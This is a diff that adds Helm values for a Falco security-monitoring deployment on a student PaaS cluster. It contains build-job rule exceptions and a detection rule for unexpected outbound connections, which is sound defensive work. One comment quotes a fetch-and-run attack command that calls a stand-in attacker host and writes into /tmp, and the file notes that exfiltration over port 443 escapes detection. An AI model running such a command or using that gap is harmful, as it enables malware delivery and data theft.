@@ -1,0 +1,117 @@
+# service-config/falco-values.yaml
+#
+# Helm values for the Falco + Falcosidekick release.
+# Applied via: service-config/falco-setup.sh (see that script for the full
+# helm install/upgrade command).
+#
+# Reversibility notes (see falco-integration-plan.md §6 for full detail):
+#   - To change alert volume later, edit `falcosidekick.config.minimumpriority`
+#     below and re-run falco-setup.sh (it upgrades in place, doesn't reinstall).
+#   - To point at the real backend once it exists, edit
+#     `falcosidekick.config.webhook.address` below.
+
+# --- Driver: avoids privileged containers, no kernel headers/DKMS needed on
+# --- Ubuntu 24.04 worker VMs (kernel 5.15+, CO-RE eBPF support).
+driver:
+  kind: modern_ebpf
+
+# --- Scope: full cluster, including platform namespaces (kube-system,
+# --- metallb-system, paas-system, buet-paas-system-team23) as well as
+# --- student namespaces. No namespaceSelector restriction is set here on
+# --- purpose — see falco-integration-plan.md §6 for how to narrow this
+# --- later via a rule exception instead of redeploying.
+
+# --- Falcosidekick: deployed as a subchart of the same release so one
+# --- helm command manages both Falco and Falcosidekick together.
+falcosidekick:
+  enabled: true
+  config:
+    # warning = default noise level. Set to "debug" to see everything while
+    # testing, or "critical" to only see severe events. One-line change +
+    # falco-setup.sh re-run, nothing else needs touching.
+    minimumpriority: warning
+    webhook:
+      # In-cluster Service DNS name for the Deployer (deploy_service.py /
+      # routes/security.py), port 80 -> targetPort 5000 per
+      # service-config/deploy-service-config.yaml's Service block. Not the
+      # backend URL — see falco-integration-plan.md §5.
+      address: "http://paas-deployer.buet-paas-system-team23.svc.cluster.local/api/security/falco-alert"
+      # customHeaders (the shared-secret token) is intentionally NOT set
+      # here — it's a secret, so it's supplied via a local, gitignored
+      # override file instead. See service-config/falco-values.local.yaml.example
+      # and falco-setup.sh, which layers that file in automatically if present.
+
+# --- Custom rule exception: build-job false positive on "Drop and execute
+# --- new binary in container" (priority Critical, would hit AUTO_ACTION).
+# ---
+# --- ROOT CAUSE (structural, not tool-specific): Kaniko doesn't run nested
+# --- containers per build stage — it unpacks the student's `FROM` base
+# --- image (node:20, python:3.12, whatever) directly into this pod's own
+# --- filesystem and executes RUN commands there. Falco's frame of reference
+# --- is still "this pod's registered image is paas-builders/builder-image",
+# --- so ANY runtime binary pulled in via the student's Dockerfile — node,
+# --- python, a compiled Go binary, anything — looks identical to a dropped
+# --- implant. This is not specific to Node/npm; it fires for every
+# --- language a student's Dockerfile might use, since the mechanism is
+# --- Kaniko's build architecture itself, not any one build tool.
+# ---
+# --- Scoped to build-job pods only (container.name="paas-builder", pod name
+# --- containing "-build-job-", matching deploy_utils' actual naming), so
+# --- live app pods are NOT covered by this exception — a real dropped
+# --- binary in a running student app still fires at full severity.
+# ---
+# --- Still narrowed by path, on purpose: only exempts binaries under normal
+# --- install locations (package manager bin dirs, /usr/*, /opt/*), NOT
+# --- scratch directories like /tmp or /dev/shm — a malicious postinstall
+# --- script doing `curl attacker.com/payload -o /tmp/x && /tmp/x` still
+# --- trips this rule, since /tmp isn't a legitimate install path for any
+# --- language's package manager.
+customRules:
+  rules-buet-paas-exceptions.yaml: |-
+    - macro: known_drop_and_execute_activities
+      condition: >
+        (container.name = "paas-builder"
+         and k8s.pod.name contains "-build-job-"
+         and (proc.exepath startswith /usr/
+              or proc.exepath startswith /opt/
+              or proc.exepath contains "/node_modules/.bin/"
+              or proc.exepath contains "/.local/bin/"
+              or proc.exepath contains "/go/bin/"))
+
+    # --- Network-egress detection for build-job pods. This exists because
+    # --- binary-identity signals (the exception above, or any process-name
+    # --- allowlist) CANNOT distinguish a legitimate `node`/`npm` invocation
+    # --- from a malicious one — a compromised `postinstall` script runs
+    # --- through the exact same trusted binary, at the exact same path, as
+    # --- a normal build. Network behavior is a materially different signal:
+    # --- a build job's legitimate traffic is narrow (DNS, git/Harbor over
+    # --- HTTPS) and doesn't need arbitrary ports.
+    # ---
+    # --- HONEST LIMITATION: this catches C2/exfiltration on a non-standard
+    # --- port, but NOT exfiltration over HTTPS (443) to an attacker-controlled
+    # --- domain — that's indistinguishable from a legitimate git/Harbor call
+    # --- without a domain-level allowlist (e.g. GitHub's published IP
+    # --- ranges), which is a real but separate follow-up, not implemented
+    # --- here. Worth flagging to the supervisor as a known residual gap.
+    - list: buet_paas_allowed_outbound_ports
+      items: [53, 443]
+    - list: buet_paas_harbor_ip
+      items: ["192.168.128.152"]
+    - rule: Unexpected outbound connection from build job
+      desc: >
+        A build-job pod made an outbound connection outside its expected
+        pattern (DNS, HTTPS to git/Harbor, or the Harbor registry IP
+        directly). Build jobs run untrusted student Dockerfiles, so an
+        unusual destination port is a strong signal of C2 or exfiltration.
+      condition: >
+        outbound
+        and container.name = "paas-builder"
+        and k8s.pod.name contains "-build-job-"
+        and not (fd.rport in (buet_paas_allowed_outbound_ports))
+        and not (fd.rip in (buet_paas_harbor_ip))
+      output: >
+        Unexpected outbound connection from build job (command=%proc.cmdline
+        connection=%fd.name dest_ip=%fd.rip dest_port=%fd.rport
+        pod=%k8s.pod.name ns=%k8s.ns.name image=%container.image.repository)
+      priority: CRITICAL
+      tags: [network, mitre_exfiltration, mitre_command_and_control, buet-paas]
